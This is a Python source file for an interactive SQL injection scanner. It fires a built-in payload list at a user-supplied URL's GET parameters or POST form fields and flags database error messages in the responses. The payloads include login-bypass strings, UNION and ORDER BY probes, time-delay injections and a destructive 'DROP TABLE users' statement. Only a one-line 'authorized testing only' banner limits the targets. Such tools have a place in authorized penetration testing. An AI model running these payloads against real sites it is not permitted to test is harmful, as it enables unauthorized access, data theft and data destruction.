import requests
import os

GREEN = "\033[92m"; CYAN = "\033[96m"; YELLOW = "\033[93m"
RED = "\033[91m"; GRAY = "\033[90m"; RESET = "\033[0m"
BOLD = "\033[1m"; ACC = CYAN; BORDER = GREEN

PAYLOADS = [
    "'", "''", "`", "``", ",", "\"", "\"\"",
    "/", "//", "\\", "//\\\\",
    "' OR '1'='1", "' OR '1'='1' --", "' OR 1=1 --",
    "' OR 1=1#", "' OR 1=1/*", "') OR ('1'='1",
    "admin'--", "admin' #", "admin'/*",
    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
    "1' ORDER BY 1--", "1' ORDER BY 2--", "1' ORDER BY 3--",
    "' AND SLEEP(3)--", "'; WAITFOR DELAY '0:0:3'--",
    "1; DROP TABLE users--", "' OR 'x'='x",
    "\" OR \"x\"=\"x", "') OR ('x'='x",
]

ERROR_SIGNATURES = [
    "sql", "mysql", "sqlite", "postgresql", "oracle",
    "syntax error", "unexpected", "unterminated",
    "warning", "error in your sql", "you have an error",
    "supplied argument is not", "invalid query",
    "division by zero", "quoted string not properly terminated"
]

def test_sqli_url(url):
    print(f"\n  {ACC}[*] Testing URL: {url}{RESET}")
    print(f"  {ACC}[*] Running {len(PAYLOADS)} payloads...{RESET}\n")
    vulnerable = []

    for payload in PAYLOADS:
        test_url = url + requests.utils.quote(payload)
        try:
            r = requests.get(test_url, timeout=6,
                headers={"User-Agent": "Mozilla/5.0"})
            body = r.text.lower()
            for sig in ERROR_SIGNATURES:
                if sig in body:
                    print(f"  {RED}[!] POSSIBLE SQLi{RESET} payload: {YELLOW}{payload}{RESET}")
                    print(f"      {GRAY}Triggered: '{sig}'{RESET}")
                    vulnerable.append((payload, sig))
                    break
        except Exception as e:
            print(f"  {GRAY}[!] Error: {e}{RESET}")
            break

    if vulnerable:
        print(f"\n  {RED}[!] {len(vulnerable)} potential SQLi points found!{RESET}")
    else:
        print(f"\n  {GREEN}[+] No obvious SQLi errors detected.{RESET}")
        print(f"  {GRAY}Note: Absence doesn't mean safe — blind SQLi may exist.{RESET}")

def test_sqli_form(url, params):
    print(f"\n  {ACC}[*] Testing form at: {url}{RESET}\n")
    vulnerable = []

    for param in params:
        for payload in PAYLOADS[:10]:
            data = {p: "test" for p in params}
            data[param] = payload
            try:
                r = requests.post(url, data=data, timeout=6,
                    headers={"User-Agent": "Mozilla/5.0"})
                body = r.text.lower()
                for sig in ERROR_SIGNATURES:
                    if sig in body:
                        print(f"  {RED}[!] SQLi in param '{param}'{RESET} payload: {YELLOW}{payload}{RESET}")
                        vulnerable.append((param, payload))
                        break
            except Exception as e:
                print(f"  {GRAY}[!] Error: {e}{RESET}")
                break

    if not vulnerable:
        print(f"  {GREEN}[+] No obvious SQLi errors detected.{RESET}")

def run_sqli_tester():
    while True:
        print(f"""
{BORDER}{'─'*45}{RESET}
{ACC}{BOLD}  SQL INJECTION TESTER{RESET}
{BORDER}{'─'*45}{RESET}
  {ACC}[1]{RESET} Test URL parameter (GET)
  {ACC}[2]{RESET} Test form fields (POST)
  {ACC}[b]{RESET} Back
{BORDER}{'─'*45}{RESET}
  {GRAY}For authorized testing only.{RESET}""")
        choice = input(f"  {ACC}[sqli]>{RESET} ").strip().lower()

        if choice == "1":
            url = input(f"  {GRAY}Enter URL with param (e.g. http://site.com/page?id=1): {RESET}").strip()
            if url: test_sqli_url(url)

        elif choice == "2":
            url = input(f"  {GRAY}Enter form URL: {RESET}").strip()
            params = input(f"  {GRAY}Enter param names (comma separated e.g. user,pass): {RESET}").strip()
            if url and params:
                test_sqli_form(url, [p.strip() for p in params.split(',')])

        elif choice == "b":
            break
        else:
            print(f"  {YELLOW}[!] Invalid option.{RESET}")
        input(f"\n  {GRAY}Press Enter to continue...{RESET}")
